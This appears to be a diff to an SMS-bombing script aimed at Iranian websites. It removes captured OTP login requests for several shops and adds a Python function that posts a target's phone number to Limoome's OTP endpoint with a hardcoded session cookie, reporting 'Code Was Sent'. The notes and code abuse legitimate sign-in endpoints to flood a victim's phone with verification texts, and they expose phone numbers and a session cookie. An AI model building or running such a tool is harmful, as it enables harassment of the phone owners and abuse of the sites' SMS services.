@@ -7,17 +7,6 @@ https://pashikshoes.com/  https://gitamehr.ir/
 
 
 Request URL
-https://accounts.khanoumi.com/account/login/init
-
-applicationId
-b92fdd0f-a44d-4fcc-a2db-6d955cce2f5e
-loginIdentifier
-09128887494
-loginSchemeName
-sms
----------------------------------------------------------------
-
-Request URL
 https://www.1001kharid.com/wp-admin/admin-ajax.php
 Request Method
 POST
@@ -217,18 +206,6 @@ referrer
 : 
 "https://www.google.com/"
 ---------------------------------------------------------------
-Request URL
-https://kart.ir/api/auth/authenticate
-Request Method
-POST
-Status Code
-200 OK
-
-{username: "09123456456"}
-username
-: 
-"09123456456"
----------------------------------------------------------------
 1:
 Request URL
 https://nickdigi.ir/wp-content/plugins/Shahkar/includes/AJAX/Clients/AUTH/CheckUserExists.php
@@ -290,49 +267,6 @@ digits_form
 _wp_http_referer
 /?login=true&page=1&redirect_to=https%3A%2F%2F70kala.ir%2F
 show_force_title
-1
----------------------------------------------------------------
-1:
-Request URL
-https://www.onlinekala.ir/login?back=my-account
-Request Method
-POST
-Status Code
-200 OK
-
-back
-my-account
-action
-showForm
-type
-register
-username
-ajax
-1
-
-2:
-Request URL
-https://www.onlinekala.ir/login?back=my-account
-Request Method
-POST
-Status Code
-200 OK
-
-back
-my-account
-username
-09122221515
-id_customer
-back
-firstname
-مانس 
-lastname
-مین
-action
-register
-back
-my-account
-ajax
 1
 ---------------------------------------------------------------
 Request URL
@@ -492,6 +426,7 @@ def alibaba(phone):
             return True
     except:
         pass
+---------------------------------------------------------------
 
 def okorosh(phone):
     okJ = {
@@ -516,7 +451,29 @@ def okorosh(phone):
             return True
     except:
         pass
-
+---------------------------------------------------------------
+def limome(phone):
+    liD = {'mobileNumber': phone.split('+98')[1],
+'country': '1'}
+    liU = 'https://my.limoome.com/api/auth/login/otp'
+    liH = {'Accept': 'application/json, text/javascript, */*; q=0.01',
+'Accept-Encoding': 'gzip, deflate, br',
+'Accept-Language': 'en-US,en;q=0.9',
+'Connection': 'keep-alive',
+'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+'Cookie': 'sess=00da3860-929a-4429-aef9-82bb64f9a439; basalam-modal=1',
+'Host': 'my.limoome.com',
+'Origin': 'https://my.limoome.com',
+'Referer': 'https://my.limoome.com/login?redirectlogin=%252Fdiet%252Fpayment',
+'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33',
+'X-Requested-With': 'XMLHttpRequest'}
+    try:
+        liR = post(timeout=5, url=liU, headers=liH, data=liD).json()
+        if liR['status'] == 'success':
+            print(f'{g}(Limome) {w}Code Was Sent')
+            return True
+    except:
+        pass
 
 
 
